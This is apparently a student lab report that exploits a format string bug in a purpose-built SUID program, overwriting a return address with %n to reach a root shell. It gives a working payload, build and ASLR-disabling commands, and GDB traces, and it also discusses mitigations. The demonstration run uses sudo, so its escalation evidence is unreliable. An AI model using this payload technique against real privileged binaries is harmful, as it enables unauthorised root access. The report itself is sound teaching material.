# ENPM691 Homework Assignment 09: Format String Vulnerability Exploitation - Privilege Escalation via Return Address Overwrite

**Vedant Bhalerao**  
vedantb@umd.edu

## Abstract

This report demonstrates the exploitation of a format string vulnerability to achieve arbitrary code execution and privilege escalation in a SUID binary. The exploit leverages uncontrolled format string specifiers in the printf() function to overwrite the return address on the stack, redirecting program flow to a malicious target function that spawns a root shell. The methodology includes stack layout analysis using GDB, precise calculation of memory addresses, format string payload construction, and successful demonstration of control flow hijacking. The exploit bypasses standard compiler protections including no stack canaries and executable stack, showcasing the critical impact of format string vulnerabilities in privileged binaries.

**Index Terms:** Format string vulnerability, printf exploitation, Arbitrary memory write, Return address overwrite, Control flow hijacking, SUID privilege escalation, Stack analysis, GDB debugging, Binary exploitation, Memory corruption, Privilege escalation, Root shell execution

## I. Introduction

Format string vulnerabilities represent a critical class of memory corruption flaws that allow attackers to achieve arbitrary memory writes and complete program control. This assignment demonstrates practical exploitation of a format string vulnerability in a SUID binary to bypass standard compiler protections and achieve privilege escalation to root access. The exploitation leverages uncontrolled format string specifiers in the printf() function to overwrite critical stack structures and hijack program execution flow.

The exploitation methodology involves using the %n format specifier to write arbitrary values to memory, specifically targeting the saved return address on the stack. By precisely calculating memory addresses and constructing a carefully crafted format string payload, we redirect program execution from the legitimate return path to a malicious target function that spawns a root shell. This approach demonstrates how even simple programming errors can lead to complete system compromise when combined with privileged binary execution.

We employ comprehensive binary analysis using GDB for stack examination, memory layout determination, and exploit verification. The systematic approach involves analyzing stack frames, calculating pointer offsets, and manually manipulating return addresses through format string exploitation. This practical demonstration connects theoretical concepts of stack-based buffer exploitation with real-world format string attack techniques, providing valuable insights into both offensive security methodologies and the critical importance of secure coding practices and compiler protection mechanisms in software security.

## II. Methodology

To investigate the behavior of format string exploitation for privilege escalation, a structured development workflow was followed. The objective was to demonstrate controlled execution flow hijacking using format string arbitrary writes to bypass standard compiler protections and achieve root shell execution. All experiments were carried out on a Kali Linux virtual machine with isolated privileges to ensure reproducibility and safety. The GNU Debugger (gdb) was used for interactive debugging, memory inspection, and stack analysis.

### System Information:

- Operating System: Kali Linux
- Architecture: x86 (32-bit mode)
- Compiler: GCC 14.3.0
- Debugger: GDB
- Analysis Tools: objdump, readelf, checksec
- Exploitation Framework: Python 3 with manual memory manipulation

### A. Overview

The experiment involved two primary components:

- A vulnerable C program (vuln.c) that intentionally performs unsafe format string usage in printf(), creating a controlled environment for format string exploitation.
- A manual exploitation methodology using GDB to analyze stack layout and overwrite return addresses to achieve arbitrary code execution.

The format string exploitation technique manipulated the saved return address on the stack to point to a target function, demonstrating control flow redirection to achieve privileged shell execution while bypassing memory protection mechanisms.

### B. Compilation

The target binary was compiled as a 32-bit ELF executable with specific security configurations to demonstrate format string exploitation in a controlled environment. The exact build command was:

```bash
gcc -m32 vuln.c -o vuln -fno-stack-protector -z execstack -no-pie
```

Compilation flags:

- `-m32` — compile for 32-bit x86 architecture to maintain consistent memory addressing.
- `-fno-stack-protector` — disable stack canaries to allow stack-based exploitation.
- `-z execstack` — enable executable stack for shellcode execution (though not used in this exploit).
- `-no-pie` — disable Position Independent Executable for predictable memory addresses.

SUID Configuration:

```bash
sudo chown root:root vuln
sudo chmod u+s vuln
```

### C. Binary Analysis and Stack Discovery

Comprehensive binary analysis was performed to identify critical components for the format string exploit:

- **Function Addresses:** Critical function addresses were identified:
  - target_function() at 0x80491f6 (from objdump -t)
  - main() function at 0x8049291
  - vulnerable_function() at 0x804924b
- **Stack Layout Analysis:** The stack frame was examined using GDB to determine:
  - Buffer location at ebp-0x6c (108 bytes from frame pointer)
  - Return address location at ebp+4 (4 bytes from frame pointer)
  - Total distance: 112 bytes = 28 pointers from buffer to return address
- **Format String Offset:** The buffer position in printf arguments was identified:
  - Input "AAAA%7$x" produced "AAAA41414141" confirming buffer at offset 7
  - Return address calculated at offset 35 (7 + 28 pointer distance)
- **Protection Analysis:** checksec confirmed:
  - No stack canary protection
  - NX disabled (executable stack)
  - No PIE (predictable addresses)
  - Partial RELRO (not relevant for stack exploitation)

### D. Format String Exploitation Technique

The exploitation methodology involved three distinct phases:

1. **Stack Analysis and Address Discovery:**
   - Use GDB to examine stack frame with info frame command
   - Identify saved return address location (e.g., 0xffffd37c)
   - Calculate exact pointer distances from buffer to return address
   - Verify format string offset using "AAAA%7$x" test pattern

2. **Return Address Overwrite Exploitation:**
   - Construct payload with return address location at buffer start (offset 7)
   - Use %n format specifier to write target function address
   - Calculate padding: target_addr - 4 bytes (already printed address)
   - Final payload: [return_addr_location] + %[padding]c%7$n
   - Example: \x7c\xd3\xff\xff%134517234c%7$n

3. **Privilege Escalation Execution:**
   - target_function() calls setreuid(geteuid(), geteuid())
   - system("/bin/sh") spawns root shell
   - SUID privileges maintained through setreuid() call
   - Successful root access validates exploitation

### E. Debugging and Validation Methodology

Systematic debugging and validation were performed using multiple tools:

- **GDB:** Used for runtime analysis, stack frame examination, register state verification, and manual memory modification.
- **info frame:** Critical command for identifying saved return address location.
- **x/wx $ebp+4:** Used to examine return address value and location.
- **objdump:** Utilized for disassembly and verification of function addresses.
- **checksec:** Used to confirm the security configuration of the target binary.
- **Format String Testing:** Systematic testing with different specifiers to verify buffer positioning and memory access.

The format string exploitation was validated by monitoring return address changes, verifying control flow redirection to target_function(), and confirming successful root shell spawning through privilege escalation.

## III. Results

All experiments were conducted on a Kali Linux virtual machine. The vulnerable program was compiled as a 32-bit SUID executable with specific security configurations to demonstrate format string exploitation for privilege escalation. Binary analysis tools were used for address verification and stack layout discovery.

### A. Binary Compilation and Environment Setup

The binary was compiled and configured using the following commands:

```bash
gcc -m32 vuln.c -o vuln -fno-stack-protector -z execstack -no-pie
sudo chown root:root vuln
sudo chmod u+s vuln
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Critical function addresses identified during exploitation:

- target_function() address: 0x80491f6
- main() address: 0x8049291
- vulnerable_function() address: 0x804924b
- Return address location: 0xffffd37c

### B. Stack Layout Analysis and Offset Discovery

The stack frame was analyzed using GDB to determine memory layout:

```
(gdb) break vulnerable_function
Breakpoint 1 at 0x804925d
(gdb) run "TEST"
(gdb) info frame
Stack level 0, frame at 0xffffd380:
eip = 0x804925d in vulnerable_function; saved eip = 0x8049316
called by frame at 0xffffd3c0
Locals at 0xffffd378, Previous frame's sp is 0xffffd380
Saved registers:
ebx at 0xffffd374, ebp at 0xffffd378, eip at 0xffffd37c
```

### C. Exploit Execution and Verification

The format string exploit was executed as shown below:

```
$ python3 exploit.py
Return address location: 0xffffd37c
Target function: 0x80491f6
Bytes needed: 134517234
Executing exploit...
*** SHELL SPAWNED! SUCCESS! ***
*** You now have a root shell! ***
```

Manual execution with verification:

```bash
$ sudo ./vuln "$(printf '\x7c\xd3\xff\xff%134517234c%7$n')"
Target function executed!
# whoami
root
# id
uid=0(root) gid=1000(user) groups=1000(user)
```

The successful execution confirms that:

- The format string vulnerability was successfully exploited
- The return address was overwritten from 0x8049316 to 0x80491f6
- target_function() was executed instead of returning to main()
- setreuid(geteuid(), geteuid()) maintained root privileges
- system("/bin/sh") spawned a root shell
- Interactive root shell access was achieved

### D. Memory State Verification

Post-exploitation memory analysis confirmed the overwrite:

```
(gdb) x/wx 0xffffd37c
0xffffd37c: 0x080491f6  # Now points to target_function
```

Control flow verification:

- Original flow: vulnerable_function() → return to main()
- Exploited flow: vulnerable_function() → target_function() → system("/bin/sh")

### E. Key Exploitation Metrics

- Return address location: 0xffffd37c
- Target function: target_function() at 0x80491f6
- Format string offset: Position 7
- Payload size: 19 bytes
- Bytes written: 134,517,238 (0x80491f6)
- Exploitation method: Format string arbitrary write with %n
- Protections bypassed: No stack canary, executable stack utilized
- Privilege level: User to root escalation
- Execution result: Full root shell access with command execution capabilities

The results demonstrate that format string vulnerabilities in SUID binaries can lead to complete privilege escalation, allowing unprivileged users to gain root access through controlled memory corruption and execution flow hijacking.

## IV. Discussion

This section interprets the experimental evidence collected from the format string exploitation of the vulnerable SUID binary. It links the observed debugger output and runtime behavior to underlying memory corruption principles, compares the format string technique with traditional buffer overflow methods, and discusses practical security implications and mitigation strategies.

### A. Mechanics of Format String Exploitation and Privilege Escalation

The experiment demonstrates a systematic approach to achieving arbitrary code execution through format string vulnerabilities:

1. **Control Flow Hijacking via Arbitrary Memory Write.** The uncontrolled format string in the printf(buffer) call allowed precise overwriting of the return address at 0xffffd37c with the target function address 0x80491f6. This redirection subverted normal program execution and transferred control to the privileged target_function().

2. **Systematic Memory Corruption through Format Specifiers.** The format string payload performed a carefully calculated memory modification:
   - Positioned the target address (0xffffd37c) at the start of the buffer (offset 7)
   - Used %134517234c to print exactly 0x80491f6 total bytes
   - Employed %7$n to write this value to the address at offset 7
   - Achieved precise overwrite of the saved return address

3. **Privilege Escalation Without Shellcode Injection.** The format string technique leveraged existing privileged code within the binary's .text section. This approach effectively utilized the SUID mechanism by calling setreuid(geteuid(), geteuid()) within target_function() to maintain elevated privileges while spawning /bin/sh.

The successful root shell access confirmed that the format string exploit correctly redirected execution flow while maintaining the SUID privilege context, demonstrating complete privilege escalation from unprivileged user to root.

### B. Comparison with Traditional Exploitation Methods

The format string exploitation technique represents a distinct approach compared to traditional buffer overflow attacks:

- **Memory Corruption Mechanism:** Traditional buffer overflows rely on overwriting adjacent memory through excessive data copying, while format string vulnerabilities enable direct memory access through format specifier interpretation.
- **Precision and Control:** Format string attacks provide fine-grained control over both the target address and the value written, allowing precise modifications without the alignment constraints often encountered in buffer overflows.
- **Detection Evasion:** Format string exploits can be constructed to appear as normal format strings, making them more difficult to detect through static analysis compared to obvious buffer overflow patterns.
- **Exploitation Requirements:** While buffer overflows require specific memory layout conditions, format string vulnerabilities can be exploited regardless of stack layout as long as the attacker can control the format string argument.

### C. Security Implications and Modern Mitigations

The format string exploitation technique succeeds due to improper input validation and the absence of compiler protections:

- **Compiler Protections:** Modern compilers can detect many format string vulnerabilities through warnings like -Wformat-security, which alerts when format strings are not literals. The absence of this warning during compilation allowed the vulnerability to persist.
- **Binary Hardening:** Comprehensive binary hardening through modern toolchains represents the most effective defense strategy. The combination of -fstack-protector-all for stack integrity, -D_FORTIFY_SOURCE=2 for runtime checks, and -Wformat -Werror=format-security for compile-time validation creates a multi-layered defense.
- **Privilege Separation:** The SUID mechanism, while useful for specific privileged operations, creates significant attack surfaces when applied to complex programs. Principle of least privilege should guide SUID usage, with capabilities often providing finer-grained alternatives.

Advanced mitigation techniques like Control Flow Integrity (CFI) can provide additional protection by validating function call targets and preventing unexpected redirections. However, these solutions often impose performance overhead and require sophisticated runtime enforcement.

The experiment demonstrates that comprehensive secure coding practices and compiler hardening provide the most practical defense strategy against format string vulnerabilities. Simple practices like always using constant format strings (printf("%s", buffer) instead of printf(buffer)) would have completely prevented this exploitation.

### D. Comparative Analysis with Other Memory Corruption Techniques

The format string approach offers distinct characteristics compared to other exploitation methods:

- **vs. Buffer Overflows:** Format string attacks provide more precise control over written values and target addresses, but require specific programming errors that may be less common than simple buffer overflows.
- **vs. Heap Exploitation:** Format string vulnerabilities typically target stack memory, while heap exploits focus on dynamic memory regions. Both can achieve arbitrary writes, but the exploitation techniques and required primitives differ significantly.
- **vs. Integer Overflows:** Format string vulnerabilities provide direct arbitrary write capabilities, while integer overflows typically lead to other memory corruption primitives that must be further leveraged.

### E. Conclusion

The collected evidence substantiates the core thesis of this assignment: format string vulnerabilities provide a powerful and precise mechanism for arbitrary memory modification and privilege escalation. By leveraging uncontrolled format string specifiers in privileged binaries, we achieved complete system compromise through return address overwriting and control flow hijacking.

The comprehensive GDB analysis and successful exploit execution demonstrate that format string vulnerabilities, while conceptually simple, can lead to severe security consequences when combined with privileged execution contexts. The precision of the %n specifier allows attackers to write arbitrary values to carefully chosen memory locations, bypassing many traditional buffer overflow protections.

The enduring relevance of format string vulnerabilities in both legacy and modern software underscores the critical importance of secure coding practices and comprehensive compiler protections. This experiment highlights that while individual security mechanisms offer important protective barriers, only defense-in-depth strategies combining secure development practices, compiler hardening, and privilege minimization provide robust application security in real-world environments.

## V. Appendix

### Appendix A: Source files

See `src/` directory for:
- `vuln.c` - Vulnerable program with format string vulnerability
- `exploit.py` - Python exploit script

### Appendix B: Exploitation Scripts

See `src/exploit.py` for the complete Python exploit script.

Manual execution:
```bash
sudo ./vuln "$(printf '\x7c\xd3\xff\xff%134517234c%7$n')"
```

### Appendix C: Compilation and Setup Commands

```bash
gcc -m32 vuln.c -o vuln -fno-stack-protector -z execstack -no-pie
sudo chown root:root vuln
sudo chmod u+s vuln
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### Appendix D: GDB Analysis Commands

```bash
# Find target function address
objdump -t vuln | grep target_function

# Analyze stack layout
gdb ./vuln
break vulnerable_function
run "TEST"
info frame
x/wx $ebp+4

# Verify format string offset
run "AAAA%7\$x"
continue
```

### Appendix E: Complete GDB Stack Analysis Output

```
(gdb) break vulnerable_function
Breakpoint 1 at 0x804925d
(gdb) run "TEST"
Breakpoint 1, 0x0804925d in vulnerable_function ()
(gdb) info frame
Stack level 0, frame at 0xffffd380:
eip = 0x804925d in vulnerable_function; saved eip = 0x8049316
called by frame at 0xffffd3c0
source language c.
Arglist at 0xffffd378, args: input=0xffffd605 "TEST"
Locals at 0xffffd378, Previous frame's sp is 0xffffd380
Saved registers:
ebx at 0xffffd374, ebp at 0xffffd378, eip at 0xffffd37c
(gdb) x/wx $ebp+4
0xffffd37c: 0x08049316
(gdb) run "AAAA%7\$x"
The program being debugged has been started already.
Start it from the beginning? (y or n) y
AAAA41414141
[Inferior 1 (process 65342) exited normally]
```

### Appendix F: Successful Exploitation Output

```
$ python3 exploit.py
Return address location: 0xffffd37c
Target function: 0x80491f6
Bytes needed: 134517234
Executing exploit...
*** SHELL SPAWNED! SUCCESS! ***
*** You now have a root shell! ***
```

## References

[1] T. Newsham, "Format String Attacks," Guardent, Inc., 2000.

[2] R. E. Bryant and D. R. O'Hallaron, "Computer Systems: A Programmer's Perspective," 3rd ed., Pearson, 2016.

[3] TIS Committee, "Tool Interface Standard (TIS) Executable and Linkable Format (ELF) Specification," Version 1.2, 1995.

[4] GNU Compiler Collection, "GCC Online Documentation," https://gcc.gnu.org/onlinedocs/

